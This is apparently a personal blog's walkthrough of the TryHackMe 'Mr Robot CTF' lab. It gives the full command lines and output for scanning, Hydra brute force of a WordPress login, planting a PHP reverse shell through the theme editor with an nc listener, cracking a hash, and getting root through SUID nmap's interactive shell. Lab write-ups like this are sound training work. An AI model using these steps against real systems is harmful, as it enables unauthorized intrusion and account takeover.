---
title: TryHackMe - Mr Robot CTF
author: Nasrallah
date: 2021-12-21 00:00:00 +0000
categories: [TryHackMe]
tags: [tryhackme, linux, web, privesc, reverse-shell, wordpress, bruteforce, hydra, suid, john, crack, gobuster]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

Hello l33ts, I hope you are doing weel. This is my first Writeup, and we will be doing [Mr robot CTF](https://tryhackme.com/room/mrrobot) from tryhackme, it is a medium machine based on the Mr. RObot show. let's dive into it.

## **Description**
 
Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

## **Enumeration**

### Nmap
First, let's start our nmap scan using this command:
`sudo nmap -sV -sC {target_IP} -oN nmap.scan`

-sV - find the version of all the service running on the target

-sC - run all the default scripts

-oN - save the output in a file called nmap

```terminal
$ sudo nmap -sV -sC 10.10.117.187
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 05:24 EST
Nmap scan report for 10.10.117.187
Host is up (0.10s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.23 seconds
```
There are three ports open: 22(SSH), 80(http), 443(https), let's navigate to port 80 and see what's there, but before that, let's run a Gobuster directory scan on the target using this command: `gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u {target_IP}`

### Gobuster

When we visit the website, we see some cool stuff going on. Unfortunately, there is nothing useful for us there, let's take a look at what Gobuster found for us:

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u http://10.10.117.187
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.187
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/21 05:56:02 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.117.187/0/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.117.187/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.117.187/feed/atom/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.117.187/audio/]  
/blog                 (Status: 301) [Size: 234] [--> http://10.10.117.187/blog/]   
/css                  (Status: 301) [Size: 233] [--> http://10.10.117.187/css/]    
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.117.187/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]                                      
/feed                 (Status: 301) [Size: 0] [--> http://10.10.117.187/feed/]     
/image                (Status: 301) [Size: 0] [--> http://10.10.117.187/image/]    
/Image                (Status: 301) [Size: 0] [--> http://10.10.117.187/Image/]    
/images               (Status: 301) [Size: 236] [--> http://10.10.117.187/images/]
/index.html           (Status: 200) [Size: 1188]                                   
/index.php            (Status: 301) [Size: 0] [--> http://10.10.117.187/]          
/intro                (Status: 200) [Size: 516314]                                 
/js                   (Status: 301) [Size: 232] [--> http://10.10.117.187/js/]     
/license              (Status: 200) [Size: 309]                                    
/login                (Status: 302) [Size: 0] [--> http://10.10.117.187/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.117.187/]            
/phpmyadmin           (Status: 403) [Size: 94]                                       
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.117.187/feed/rdf/]   
/readme               (Status: 200) [Size: 64]                                       
/robots               (Status: 200) [Size: 41]                                       
/robots.txt           (Status: 200) [Size: 41]                                       
/rss                  (Status: 301) [Size: 0] [--> http://10.10.117.187/feed/]       
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.117.187/feed/]       
/sitemap              (Status: 200) [Size: 0]                                        
/sitemap.xml          (Status: 200) [Size: 0]                                        
/video                (Status: 301) [Size: 235] [--> http://10.10.117.187/video/]    
/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.117.187/wp-admin/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.117.187/wp-content/]
/wp-config            (Status: 200) [Size: 0]                                         
/wp-cron              (Status: 200) [Size: 0]                                         
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.117.187/wp-includes/]
/wp-load              (Status: 200) [Size: 0]                                          
/wp-links-opml        (Status: 200) [Size: 227]                                        
/wp-login             (Status: 200) [Size: 2613]                                       
/wp-mail              (Status: 500) [Size: 3064]                                       
/wp-settings          (Status: 500) [Size: 0]                                          
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.117.187/wp-login.php?action=register]
/xmlrpc               (Status: 405) [Size: 42]                                                       
/xmlrpc.php           (Status: 405) [Size: 42]         
```

We can see that Gobuster has found robots.txt along with other files and directories. The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. Let's take a look at robots.txt .

![robots](/assets/img/tryhackme/mrrobotctf/robots.png)

Great! we found our first key, as well as fsocity.dic, the file contain a bunch of words in seperate lines, it seems that it is a wordlist, it contains more than 850k words, let's remove repeated words using this commad: `sort fsocity.dic | uniq > sorted.dic`.

Let's continue our enumeration, gobuster also found wp-login, let's visit that page.

![login](/assets/img/tryhackme/mrrobotctf/login.png)

As expected, it is a login page for wordpress, trying some default credentials only gets us ERROR: Invalid username, maybe if we submit a correct username we get something different.

Using hydra, we can brute force the username with the wordlist we found earlier, but first lets look at the source code of the page.

![sourcecode](/assets/img/tryhackme/mrrobotctf/params.png)

We can see that the method used to submit data is a POST request, with the username parameter "log" and password parameter "pwd", with these information, we can now start hydra with the following command:`hydra -L sorted.dic -p test {target_IP} http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"`

```terminal
 $ hydra -L sorted.dic -p test 10.10.117.187 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-21 09:01:17
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://10.10.117.187:80/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username
[STATUS] 1233.00 tries/min, 1233 tries in 00:01h, 10219 to do in 00:09h, 16 active
[STATUS] 1235.67 tries/min, 3707 tries in 00:03h, 7745 to do in 00:07h, 16 active
[80][http-post-form] host: 10.10.117.187   login: elliot   password: test
[80][http-post-form] host: 10.10.117.187   login: ELLIOT   password: test
[80][http-post-form] host: 10.10.117.187   login: Elliot   password: test
```

We found our username, let's now brute force the password using the same command but with some changes: `$ hydra -l elliot -P sorted.dic 10.10.117.187 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"`

```terminal
 $ hydra -l elliot -P sorted.dic 10.10.117.187 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"         130 ⨯
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-21 10:10:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://10.10.117.187:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username
[STATUS] 1174.00 tries/min, 1174 tries in 00:01h, 10278 to do in 00:09h, 16 active
[STATUS] 1169.67 tries/min, 3509 tries in 00:03h, 7943 to do in 00:07h, 16 active
[80][http-post-form] host: 10.10.117.187   login: elliot   password: 'redacted'
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-21 10:15:55
```

Great, we got the password, now let's login using the credentials we found.

![elliot.png](/assets/img/tryhackme/mrrobotctf/elliot.png)

## **Foothold**

Now that we got access to wordpress account, i googled 'wordpress reverse shell' and found this useful [article](https://www.hackingarticles.in/wordpress-reverse-shell/), it explains how we can get a reverse shell by injecting a malicious php code as a wordpress theme, for that i used pentestmonkey php reverse shell that you can find [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), you have to change the ip in the code to your machine's ip, and then set up a listener on your machine using the following command: `nc -nlvp 1234`.

When you finish the setup, visit the page we have edited: `http://{target_IP}/wp-content/themes/twentyfifteen/404.php`

And just like that, we got a reverse shell! In order to have a functional shell though we can issue the following:

```terminal
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.11.31.131] from (UNKNOWN) [10.10.117.187] 51538
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
15:21:18 up  5:21,  0 users,  load average: 0.00, 0.01, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ export TERM=xterm
export TERM=xterm
daemon@linux:/$ ^Z #pressed ctrl+z
zsh: suspended  nc -lnvp 1234

$ stty raw -echo;fg                                                                                                                          148 ⨯ 1 ⚙
[1]  + continued  nc -lnvp 1234

daemon@linux:/$
```

## **Privilege Escalation**

### robot

Navigating to /home/robot we find out 2nd key, but we can read it, there is also a file called password.raw-md5 and we can read it, i cracked it using [crackstation](https://crackstation.net/) and got robot's password.
Now let's change the user using the command `su robot` and supplying the password we cracked.

```terminal
daemon@linux:/home/robot$ su robot
Password:
robot@linux:~$ whoami
robot
```

Now we can read our 2nd key.
### root

Let's now upgrade to root and get the 3rd key.
Before running any privilege escalation or enumeration script, let's check the basic commands for elevating
privileges like  sudo  and  id :

```terminal
robot@linux:~$ sudo -l
[sudo] password for robot:
Sorry, user robot may not run sudo on linux.
robot@linux:~$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$
```

We got nothing, let's now look for some SUID binaries using:`find / -type f -perm -04000 2>/dev/null`

```terminal
robot@linux:~$ find / -type f -perm -04000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
robot@linux:~$

```

We can use [GTFOBins](https://gtfobins.github.io/) to check for possible vectors, and we see that nmap does not have SUID bit by default. Let's use it to get root on the machine:

```terminal
robot@linux:~$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root
# cd /root
# ls
firstboot_done  key-3-of-3.txt
```

Great, and just like that, we have rooted this machine, hope you enjoyed it, see you in the next machine.
